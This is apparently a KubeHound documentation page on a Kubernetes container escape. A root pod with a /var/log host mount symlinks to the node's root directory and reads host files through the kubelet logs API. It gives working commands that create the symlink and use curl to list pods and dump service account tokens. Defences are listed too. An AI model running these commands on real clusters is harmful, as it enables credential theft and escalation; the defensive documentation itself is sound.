---
title: CE_VAR_LOG_SYMLINK
---

<!--
id: CE_VAR_LOG_SYMLINK
name: "Arbitrary file reads on the host"
mitreAttackTechnique: T1611 - Escape to host
mitreAttackTactic: TA0004 - Privilege escalation
-->

# CE_VAR_LOG_SYMLINK

| Source                                | Destination                 | MITRE ATT&CK                                                        |
| ------------------------------------- | --------------------------- | ------------------------------------------------------------------- |
| [Container](../entities/container.md) | [Node](../entities/node.md) | [Escape to Host, T1611](https://attack.mitre.org/techniques/T1611/) |

Arbitrary file reads on the host from a node via an exposed `/var/log` mount.

## Details

A pod running as root and with a mount point to the node's `/var/log` directory can expose the entire contents of its host filesystem to any user who has access to its logs, enabling an attacker to read arbitrary files on the host node. See [Kubernetes Pod Escape Using Log Mounts](https://blog.aquasec.com/kubernetes-security-pod-escape-log-mounts) for a more detailed explanation of the technique.

## Prerequisites

Execution as root within a container process with the host `/var/log/` (or any parent directory) mounted inside the container.

See the [example pod spec](https://github.com/DataDog/KubeHound/tree/main/test/setup/test-cluster/attacks/CE_VAR_LOG_SYMLINK.yaml).

## Checks

Determine mounted volumes within the container as per [VOLUME_DISCOVER](./VOLUME_DISCOVER.md#checks) If the host `/var/log` (or any parent directory) is mounted, this attack will be possible. Example output below:

```bash
cat /proc/self/mounts

...
/dev/vda1 on /host/var/log type ext4 (rw,relatime)
...
```

```bash
# Examine the directory structure of any hostPath mounts to verify it is the log directory
ls -la /host/var/log
total 24
drwxr-xr-x 5 root root 4096 Mar  2 09:49 .
drwxr-xr-x 3 root root 4096 Mar  8 10:31 ..
-rw-r--r-- 1 root root  775 Mar  4 18:13 alternatives.log
drwxr-xr-x 2 root root 4096 Mar  8 10:46 containers
drwxr-xr-x 3 root root 4096 Mar  2 09:49 kubernetes
drwxr-xr-x 8 root root 4096 Mar  8 10:31 pods

ls -la /host/var/log/pods
total 32
drwxr-xr-x  8 root root 4096 Mar  8 10:31 .
drwxr-xr-x  5 root root 4096 Mar  2 09:49 ..
drwxr-xr-x  3 root root 4096 Mar  8 10:31 default_log-escape-pod_f262a349-c3bb-4561-9496-c3182f8d1256
```

## Exploitation

Setup the symlink:

```bash
ln -s / /host/var/log/root_link
```

Call the kubelet API to read the "logs" and extract pod service account tokens:

```bash
$ KUBE_TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
$ NODEIP=$(ip route | awk '/^default/{print $3}')
# On Amazon EKS, if you have access to the IMDS: NODEIP=$(curl http://169.254.169.254/latest/meta-data/local-ipv4)

# Find all the pods
$ curl -sk -H "Authorization: Bearer $KUBE_TOKEN" https://$NODEIP:10250/logs/root_link/var/lib/kubelet/pods/

# <pre>
# <a href="10b90d62-6b16-4aa7-9e72-75f18dcca5a8/">10b90d62-6b16-4aa7-9e72-75f18dcca5a8/</a>
# <a href="2254e754-fbe0-48c4-b0c8-236a232fa510/">2254e754-fbe0-48c4-b0c8-236a232fa510/</a>
# <a href="324fe80e-e10e-462b-b046-be4c15e91b4e/">324fe80e-e10e-462b-b046-be4c15e91b4e/</a>
# <a href="5a9fc508-8410-444a-bf63-9f11e5979bee/">5a9fc508-8410-444a-bf63-9f11e5979bee/</a>
# <a href="a1176593-34a2-43e6-8bdd-ed10fa148fe7/">a1176593-34a2-43e6-8bdd-ed10fa148fe7/</a>
# <a href="a83a37cf-01ea-4b4c-ad19-f67e374cf255/">a83a37cf-01ea-4b4c-ad19-f67e374cf255/</a>
# <a href="dfbf38ad-2e92-44e0-b05b-8859350b6ea5/">dfbf38ad-2e92-44e0-b05b-8859350b6ea5/</a>
# </pre>

# Dump the token
$ curl -sk -H "Authorization: Bearer $KUBE_TOKEN" https://$NODEIP:10250/logs/root_link/var/lib/kubelet/pods/10b90d62-6b16-4aa7-9e72-75f18dcca5a8/volumes/kubernetes.io~projected/kube-api-access-j7dsp/token

# eyJhbGciOiJSUzI1NiIsImtpZCI6I****REDACTED****
```

Cleanup the symlink when exploitation is complete:

```bash
rm /host/var/log/root_link
```

NOTE: the above assumes the serviceaccount has access to read logs. If *not* replace the token for any user token which should normally have logs access.

## Defences

### Monitoring

+ Monitor for suspicious symlink creation in the `/var/log` directory.

### Implement security policies

Use a pod security policy or admission controller to prevent or limit the creation of pods with a `hostPath` mount of `/var/log` or other sensitive locations.

### Least Privilege

Avoid running containers as the `root` user. Enforce running as an unprivileged user account using the `runAsNonRoot` setting inside `securityContext` (or explicitly setting `runAsUser` to an unprivileged user). Additionally, ensure that `allowPrivilegeEscalation: false` is set in `securityContext` to prevent a container running as an unprivileged user from being able to escalate to running as the `root` user.

## Calculation

+ [EscapeVarLogSymlink](https://github.com/DataDog/KubeHound/tree/main/pkg/kubehound/graph/edge/escape_var_log_symlink.go)

## References:

+ [Kubernetes Pod Escape Using Log Mounts](https://blog.aquasec.com/kubernetes-security-pod-escape-log-mounts) 
+ [Kubelet API · Deep Network](https://www.deepnetwork.com/blog/2020/01/13/kubelet-api.html#logs)
